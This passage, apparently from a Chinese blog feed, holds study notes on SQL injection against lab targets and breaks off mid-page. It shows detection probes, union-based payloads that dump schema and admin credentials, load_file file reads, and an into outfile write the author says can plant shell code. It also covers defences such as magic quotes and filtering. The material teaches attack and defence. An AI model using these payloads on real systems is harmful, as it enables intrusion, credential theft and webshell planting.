        <content type="html"><![CDATA[<h1 id="一-SQL注入"><a href="#一-SQL注入" class="headerlink" title="一.SQL注入"></a>一.SQL注入</h1><h2 id="（一）基础知识"><a href="#（一）基础知识" class="headerlink" title="（一）基础知识"></a>（一）基础知识</h2><h3 id="1危害："><a href="#1危害：" class="headerlink" title="1危害："></a>1危害：</h3><p><strong>（1）操纵数据</strong></p><p><strong>（2）数据写入，getshell，网站权限</strong></p><hr><h3 id="2-实质"><a href="#2-实质" class="headerlink" title="2.实质"></a>2.实质</h3><p><strong>通过构建特殊的输入作为参数传入Web应用程序，而这些输入大都是SQL语法里的 一些组合，通过执行SQL语句进而执行攻击者所要的操作，其主要原因是程序没有细致地过滤用户输入 的数据，致使非法数据侵入系统。恶意代码（参数值的传入），实现自定义的一种查询</strong></p><h3 id="3-条件："><a href="#3-条件：" class="headerlink" title="3.条件："></a>3.条件：</h3><p><strong>1.可控制的变量，带入查询数据库，变量为存在过滤，过滤不严谨</strong></p><h3 id="4-注意："><a href="#4-注意：" class="headerlink" title="4.注意："></a>4.注意：</h3><p>​       <strong>1）注入参数点的位置</strong></p><p>​            <strong>2）不同数据库的注入思路不同</strong></p><hr><h3 id="5-SQL语句干扰符号：’，”，-，），"><a href="#5-SQL语句干扰符号：’，”，-，），" class="headerlink" title="5.SQL语句干扰符号：’，”，%，），}"></a>5.SQL语句干扰符号：’，”，%，），}</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#在MySQL中，下面谅两句查询的结果相同</span><span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">;</span><span class="token keyword">select</span> <span class="token operator">*</span><span class="token keyword">from</span> <span class="token keyword">user</span> <span class="token keyword">where</span> id<span class="token operator">=</span><span class="token string">"1"</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="6-通过order-by猜测网页查询的字段数"><a href="#6-通过order-by猜测网页查询的字段数" class="headerlink" title="6.通过order by猜测网页查询的字段数"></a>6.通过order by猜测网页查询的字段数</h3><h3 id="7-注入分类"><a href="#7-注入分类" class="headerlink" title="7.注入分类"></a>7.注入分类</h3><p><strong>(1)数字型注入</strong></p><p>当输入的参数为整型时，则有可能存在数字型注入漏洞。 </p><p>假设存在一条 URL 为： HTTP://<a href="http://www.aaa.com/test.php?id=1">www.aaa.com/test.php?id=1</a></p><p> 可以对后台的 SQL 语句猜测为：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>判断数字型漏洞的 SQL 注入点：</strong></p><p>**① 先在输入框中输入一个单引号 ‘ **</p><p>这样的 SQL 语句就会变为： </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span>'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>不符合语法，所以该语句肯定会出错，导致脚本程序无法从数据库获取数据，从而使原来的页面出现异 常。</p><p>**② 在输入框中输入 and 1 = 1 **</p><p>SQL语句变为： </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>语句正确，执行正常，返回的数据与原始请求无任何差异。</p><p>**③ 在数据库中输入 and 1 = 2 **</p><p>SQL 语句变为： </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token number">1</span> <span class="token operator">and</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">2</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>虽然语法正确，语句执行正常，但是逻辑错误，因为 1 = 2 为永假，所以返回数据与原始请求有差异。 如果以上三个步骤全部满足，则程序就可能存在数字型 SQL 注入漏洞。</p><p><strong>(2)字符型注入</strong></p><p>当输入参数为字符串时，则可能存在字符型注入漏洞。数字型与字符型注入最大的区别在于：数字型不 需要单引号闭合，而<strong>字符型一般需要使用单引号来闭合</strong>。</p><p> 字符型注入最关键的是如何<strong>闭合 SQL 语句以及注释多余的代码</strong>。</p><p> 假设后台的 SQL 语句如下：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>判断字符型漏洞的 SQL 注入点：</strong></p><p>**① 还是先输入单引号 admin’ 来测试 **</p><p>这样的 SQL 语句就会变为：</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span>'。<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p> 页面异常。</p><p>**② 输入： admin’ and 1 = 1 – **</p><p>注意：在 admin 后有一个单引号 ‘ ，用于字符串闭合，最后还有一个注释符 – <strong>(两条杠后面还有一个空 格！！！)。</strong></p><p> SQL 语句变为： </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">and</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">1</span> <span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面显示正确。</p><p>**③ 输入： admin’ and 1 = 2 – **</p><p>SQL 语句变为： </p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> <span class="token keyword">table</span> <span class="token keyword">WHERE</span> username <span class="token operator">=</span> <span class="token string">'admin'</span> <span class="token operator">and</span> <span class="token number">1</span> <span class="token operator">=</span> <span class="token number">2</span> <span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>页面错误。 </p><p>满足上面三个步骤则有可能存在字符型 SQL 注入。</p><blockquote><p><strong>如果没有反应，证明网站未处理，可能没有注入点。如果网页返回404，或者跳转，可能网站有过滤，也可能不存在注入点</strong></p></blockquote><p><strong>(3)其他类型</strong></p><p>Cookie 注入、POST 注 入、延时注入等。 这些类型的注入归根结底也是数字型和字符型注入的不同展现形式或者注入的位置不同。 </p><p>以下是一些常见的注入叫法： </p><ul><li>POST注入：注入字段在 POST 数据中 </li><li>Cookie注入：注入字段在 Cookie 数据中 </li><li>延时注入：使用数据库延时特性注入 </li><li>搜索注入：注入处为搜索的地方 </li><li>base64注入：注入字符串需要经过 base64 加密</li></ul><h3 id="8注入思路"><a href="#8注入思路" class="headerlink" title="8注入思路"></a>8注入思路</h3><ul><li><p>明确数据库类型，权限</p></li><li><p>明确提交方法，参数类型</p></li><li><p>低权限：明确数据库记录信息系统表</p><p>​                依次库，表，列，值，注入查询</p><p>​                 找后台，登录，获取shell（可能失败）</p></li><li><p>高权限：文件读写，命令执行，注册表读取</p></li></ul><h2 id="（二）mysql注入"><a href="#（二）mysql注入" class="headerlink" title="（二）mysql注入"></a>（二）mysql注入</h2><h3 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h3><blockquote><p>1）操作系统:@@version_compile_cs(不同的系统对数据库操作语句的大小写区分）</p><p>2）数据库名:database()</p><p>3）数据库用户:user()（专门管理数据库的账户）,root为最高权限，容易导致跨站注入数     据。普通用户：只能注入自己网站。数据库的配置文件决定用户的权限。</p><p>4）数据库版本:version()（选择注入）</p><p>5）其他网站路径（进行文件读取，为高权限读取做准备）</p></blockquote><h3 id="2-数据注入"><a href="#2-数据注入" class="headerlink" title="2.数据注入"></a>2.数据注入</h3><blockquote><p>1）低版本（暴力或结合读取查询，表名，列名用猜的方式）</p><p>2）高版本（information_schema有据查询）</p></blockquote><h3 id="3-高权限注入"><a href="#3-高权限注入" class="headerlink" title="3.高权限注入"></a>3.高权限注入</h3><blockquote><p>1）常规查询</p><p>2）跨库查询</p><p>3）文件读写 </p></blockquote><hr><h3 id="4-数据库自带方法"><a href="#4-数据库自带方法" class="headerlink" title="4.数据库自带方法"></a>4.数据库自带方法</h3><blockquote><p>database()查询数据库名称</p><p>user()查询数据库用户</p><p>version()查询数据库版本</p><p>information_schema –5.0以上版本才有，储存所有的数据库名，表名，列名，可以通过查询他获取指定数据库下面的表名或列名信息</p></blockquote><blockquote><p>load_file():文件读取  ，</p><p>into outfile()或into dumfile():  导出函数</p></blockquote><h3 id="5-information-shema"><a href="#5-information-shema" class="headerlink" title="5.information_shema"></a>5.information_shema</h3><blockquote><p><strong>在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。</strong></p><p><strong>因为非root型的数据库是无法看见数据库表名的</strong></p><p><strong>数据库中的”.“表示下一级</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span><span class="token comment">--记录所有表名信息的表</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th>字段</th><th>含义</th></tr></thead><tbody><tr><td>Table_catalog</td><td>数据表登记目录</td></tr><tr><td>Table_schema</td><td>数据表所属的数据库名</td></tr><tr><td>Table_name</td><td>表名称</td></tr><tr><td>Table_type</td><td>表类型[system view|base table]</td></tr><tr><td>Engine</td><td>使用的数据库引擎[MyISAM|CSV|InnoDB]</td></tr><tr><td>Version</td><td>版本，默认值10</td></tr><tr><td>Row_format</td><td>行格式[Compact|Dynamic|Fixed]</td></tr><tr><td>Table_rows</td><td>表里所存多少行数据</td></tr><tr><td>Avg_row_length</td><td>平均行长度</td></tr><tr><td>Data_length</td><td>数据长度</td></tr><tr><td>Max_data_length</td><td>最大数据长度</td></tr><tr><td>Index_length</td><td>索引长度</td></tr><tr><td>Data_free</td><td>空间碎片</td></tr><tr><td>Auto_increment</td><td>做自增主键的自动增量当前值</td></tr><tr><td>Create_time</td><td>表的创建时间</td></tr><tr><td>Update_time</td><td>表的更新时间</td></tr><tr><td>Check_time</td><td>表的检查时间</td></tr><tr><td>Table_collation</td><td>表的字符校验编码集</td></tr><tr><td>Checksum</td><td>校验和</td></tr><tr><td>Create_options</td><td>创建选项</td></tr><tr><td>Table_comment</td><td>表的注释、备注</td></tr></tbody></table><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span><span class="token comment">--记录所有列明信息的表</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>- </p><table><thead><tr><th><strong>字段</strong></th><th><strong>含义</strong></th></tr></thead><tbody><tr><td>table_schema</td><td>表所有者（对于schema的名称）</td></tr><tr><td>table_name</td><td>表名</td></tr><tr><td>column_name</td><td>列名</td></tr><tr><td>ordinal_position</td><td>列标识号</td></tr><tr><td>column_default</td><td>列的默认值</td></tr><tr><td>is_nullable</td><td>列的为空性。如果列允许 null，那么该列返回 yes。否则，返回 no</td></tr><tr><td>data_type</td><td>系统提供的数据类型</td></tr><tr><td>character_maximum_length</td><td>以字符为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 null。有关更多信息，请参见数据类型</td></tr><tr><td>character_octet_length</td><td>以字节为单位的最大长度，适于二进制数据、字符数据，或者文本和图像数据。否则，返回 nu</td></tr><tr><td>numeric_precision</td><td>近似数字数据、精确数字数据、整型数据或货币数据的精度。否则，返回 null</td></tr><tr><td>numeric_precision_radix</td><td>近似数字数据、精确数字数据、整型数据或货币数据的精度基数。否则，返回 null</td></tr><tr><td>numeric_scale</td><td>近似数字数据、精确数字数据、整数数据或货币数据的小数位数。否则，返回 null</td></tr><tr><td>datetime_precision</td><td>datetime 及 sql-92 interval 数据类型的子类型代码。对于其它数据类型，返回 null</td></tr><tr><td>character_set_catalog</td><td>如果列是字符数据或 text 数据类型，那么返回 master，指明字符集所在的数据库。否则，返回 null</td></tr><tr><td>character_set_schema</td><td>如果列是字符数据或 text 数据类型，那么返回 dbo，指明字符集的所有者名称。否则，返回 null</td></tr><tr><td>character_set_name</td><td>如果该列是字符数据或 text 数据类型，那么为字符集返回唯一的名称。否则，返回 null</td></tr><tr><td>collation_catalog</td><td>如果列是字符数据或 text 数据类型，那么返回 master，指明在其中定义排序次序的数据库。否则此列为 null</td></tr><tr><td>collation_schema</td><td>返回 dbo，为字符数据或 text 数据类型指明排序次序的所有者。否则，返回 null</td></tr><tr><td>collation_name</td><td>如果列是字符数据或 text 数据类型，那么为排序次序返回唯一的名称。否则，返回 null。</td></tr><tr><td>domain_catalog</td><td>如果列是一种用户定义数据类型，那么该列是某个数据库名称，在该数据库名中创建了这种用户定义数据类型。否则，返回 null</td></tr><tr><td>domain_schema</td><td>如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的创建者。否则，返回 null</td></tr><tr><td>domain_name</td><td>如果列是一种用户定义数据类型，那么该列是这种用户定义数据类型的名称。否则，返回 NULL</td></tr></tbody></table><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">information_schema<span class="token punctuation">.</span>schemata<span class="token comment">--记录mysql中所有数据库的名称的表</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><table><thead><tr><th>字段</th><th>含义</th></tr></thead><tbody><tr><td>schema_name</td><td>数据库名称</td></tr><tr><td>default_character_set_name</td><td>数据库编码</td></tr><tr><td>default_collation_name</td><td>数据库排序规则</td></tr></tbody></table></blockquote><h3 id="6-相关防注入"><a href="#6-相关防注入" class="headerlink" title="6.相关防注入"></a>6.相关防注入</h3><blockquote><p>1.自带防御，魔术引号，magic_qutotes_gpc=on</p><p>2.内置函数进行过滤，puh中如果确定数据类型，可以用is_int()判断是否为整数</p><p>3.自定义关键字过滤，如select关键字，大小写，编码</p><p>4.WAF防护软件：安全狗，宝塔，大部分都为过滤关键字 </p></blockquote><p>limit x,y 进行x,y的筛选</p><h3 id="7案列"><a href="#7案列" class="headerlink" title="7案列"></a>7案列</h3><p><strong>tables，columns这两个的应用</strong></p><h4 id="（1）爆出数据库的所有表"><a href="#（1）爆出数据库的所有表" class="headerlink" title="（1）爆出数据库的所有表"></a>（1）爆出数据库的所有表</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> id<span class="token punctuation">,</span>email form member <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'kobe'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> table_schema<span class="token punctuation">,</span>table_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'pikachu'</span><span class="token comment">--通过information_schema下的tables可以查询pikachu数据库下的所有表</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="（2）爆出所有的列-字段名"><a href="#（2）爆出所有的列-字段名" class="headerlink" title="（2）爆出所有的列(字段名)"></a>（2）爆出所有的列(字段名)</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> id<span class="token punctuation">,</span>email form member <span class="token keyword">where</span> username<span class="token operator">=</span><span class="token string">'kobe'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> table_name<span class="token punctuation">,</span>column_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'users'</span> <span class="token operator">and</span> table_schema<span class="token operator">=</span><span class="token string">'pikachu'</span><span class="token comment">--通过information_schema下的columns可以查询某个表下面的所有字段</span><span class="token comment">--</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h4 id="（3）跨站注入"><a href="#（3）跨站注入" class="headerlink" title="（3）跨站注入"></a>（3）跨站注入</h4><blockquote><p>数据库A=网站A=数据库用户A</p><p>​               表名</p><p>​                          列名</p><p>​                                     数据</p><p>数据库B=网站B=数据库用户B</p><p>​         …..</p><p><strong>特点A网站只操作A网站的数据库，B网站只操作B网站的数据库</strong></p><p>通过一个网站的数据库注入漏洞，注入另一个网站，条件：root型数据库</p><p><strong>通过A注入B</strong></p><blockquote><p>MySQL <code>GROUP_CONCAT()</code>函数将组中的字符串连接成为具有各种选项的单个字符串。中间用逗号隔开</p></blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>schema_name<span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment">#爆出MySQL中数据库表中的第一个数据库的名称，因为有LIMIT 0,1，所以是第一个</span><span class="token keyword">select</span> schema_name <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schamata<span class="token comment">#显示MySQL中数据库表中所有数据库的名称</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>1)查看当前使用的数据库</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">2</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220413074049.PNG"></p><p><strong>1）爆出所有数据库名字</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>schema_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span>schemata <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment">#爆出MySQL中数据库表中所有数据库的名称，并且用逗号分割，也是应为limit的限制</span><span class="token comment">#因为users查询出来的是三个字段，所以联合查询查询出来的也是要是三个字段</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220412220749.PNG"></p><p><strong>2）爆出的bees数据库下的所有表</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token string">'bees'</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220413073204.PNG"></p><p><strong>3)爆出bees数据库下的bees_admin表的所有字段</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>column_name<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">columns</span> <span class="token keyword">where</span> table_name<span class="token operator">=</span><span class="token string">'bees_admin'</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220413073638.PNG"></p><p><strong>4)获取指定数据</strong></p><p>获取用admin_name,admin_password两个字段的数据</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>admin_name<span class="token punctuation">,</span>admin_password <span class="token keyword">from</span> bees<span class="token punctuation">.</span>bees_admin <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token comment">#注意后面要指定查询数据库下面的表bees.bees_admin，即bees数据库下的bees_admin表</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220413144436.PNG"></p></blockquote><h4 id="（4）文件读取"><a href="#（4）文件读取" class="headerlink" title="（4）文件读取"></a>（4）文件读取</h4><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> load_file<span class="token punctuation">(</span><span class="token string">'C:/inetpub/target/sqlilabs/.txt'</span><span class="token punctuation">)</span><span class="token comment">#注意添加冒号与斜杠的写法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><a href="%5B(18%E6%9D%A1%E6%B6%88%E6%81%AF">常见load_file()读取敏感文件</a> 常见的load_file()读取的敏感信息_weixin_30292843的博客-CSDN博客](<a href="https://blog.csdn.net/weixin_30292843/article/details/99381669">https://blog.csdn.net/weixin_30292843/article/details/99381669</a>))</p><p><strong>①文件读取的类型</strong></p><ul><li>读取服务器默认路径对应的文件</li><li>读取随机路径的文件（网站路径）</li></ul><p><strong>②路径获取的常见方法</strong></p><ul><li>报错显示（乱输入信息爆出一些文件路径），</li><li>遗留文件（站长调试时留下的文件），</li><li>漏洞报错（明确搭建的平台，搜索相关的漏洞，来获取文件的路径），</li><li>平台配置文件（读取读取配置信息来获取网站的文件的路径）</li><li>爆破（网站的常见路径，不同系统常见的路径，没办法的办法）</li></ul><p><strong>③文件的读取</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>load_file<span class="token punctuation">(</span><span class="token string">'C:/inetpub/target/sqlilabs/reds.txt'</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">LIMIT</span> <span class="token number">0</span><span class="token punctuation">,</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>读取的内容为：sqlreadfile</p><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220413152359.PNG"></p><p><strong>④文件的写入</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> <span class="token operator">*</span> <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> id<span class="token operator">=</span><span class="token operator">-</span><span class="token number">1</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'x'</span><span class="token punctuation">,</span><span class="token number">3</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'C:\\inetpub\\target\\sqlilabs\\write.txt'</span><span class="token comment">-- LIMIT 0,1</span><span class="token comment">#注意后面有--注释，在url中要--+来进行注释</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>当把x的内容换成shell代码后就实现了恶意代码的植入</strong></p><ul><li>php魔术引号的过滤（内置安全开关）magic_qutotes_gpc(php的安装目录下面)</li></ul><blockquote><p>magic_quotes_gpc函数在php中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，对__GET以及进行数据库操作的sql进行转义处理，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。防止sql注入</p><p>当magic_quotes_gpc = On时，输入数据中含单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符，都会被加上反斜线。这些转义是必须的。<br>php中的magic_quotes_gpc是配置在php.ini中的</p><p>一、当PHP magic_quotes_gpc=on<br>如果此时你对输入的数据作了addslashes()处理，<br>那么在输出的时候就必须使用stripslashes()去掉多余的反斜杠。<br>如果仅为magic_quotes_gpc=on，无再对写入数据库的字符串未经过任何处理。从数据库读出的字符串未作任何处理，则sql语句顺利执行，数据成功写入数据库，数据库保存格式和输出数据格式都和输入一样，不带反斜杠</p><p>二、当PHP magic_quotes_gpc=off<br>必须使用addslashes()对输入数据进行处理，但并不需要使用stripslashes()格式化输出<br>因为addslashes()并未将反斜杠一起写入数据库，只是帮助mysql完成了sql语句的执行。数据库保存格式和输出数据格式都和输入一样，不带反斜杠</p></blockquote><ul><li>效果</li></ul><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220413214455.PNG"></p><ul><li>解决方法，对路劲进行编码，把路径进行hex（十六进制，不添加单引号）</li></ul><h2 id="（三）请求方法的注入"><a href="#（三）请求方法的注入" class="headerlink" title="（三）请求方法的注入"></a>（三）请求方法的注入</h2><p>不同的请求方法获取的数据不同，明白数据的请求方法</p><h3 id="1-GET：数据写在URL后面，用相应的方式传递参数"><a href="#1-GET：数据写在URL后面，用相应的方式传递参数" class="headerlink" title="1. GET：数据写在URL后面，用相应的方式传递参数"></a>1. GET：数据写在URL后面，用相应的方式传递参数</h3><h3 id="2-POST：大数据提交的方式，注入点在post"><a href="#2-POST：大数据提交的方式，注入点在post" class="headerlink" title="2. POST：大数据提交的方式，注入点在post"></a>2. POST：大数据提交的方式，注入点在post</h3><blockquote><p>除了在url中体提交，也可以在网页输入上提交，如果需要与数据库连接的化就可能会存在注入，数据需要抓包才能看见。</p><p>产生的地方，多半出现在登录框，查询框，等各种和数据库有交互的框数据。</p><p>提交方式，与参数类型（单引号，双引号的干扰）</p></blockquote><blockquote><p>案列</p><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415170914.PNG"></p><p><strong>1)抓包结果可以看出，账户，密码的提交方式，猜测可能有注入点</strong></p><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415170958.PNG"></p><p><strong>2）判断注入为字符型注入</strong></p><p><strong>3）猜测字段数为2</strong></p><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415174009.PNG"></p><p><img src="https://raw.githubusercontent.com/togetherhkl/Mypictures/main/20220415173440.PNG"></p><p><strong>4)联合查询，查询数据库名与数据库用户</strong></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SELECT</span> username<span class="token punctuation">,</span> password <span class="token keyword">FROM</span> users <span class="token keyword">WHERE</span> username<span class="token operator">=</span><span class="token string">''</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token keyword">user</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#'and password='' LIMIT 0,1</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img 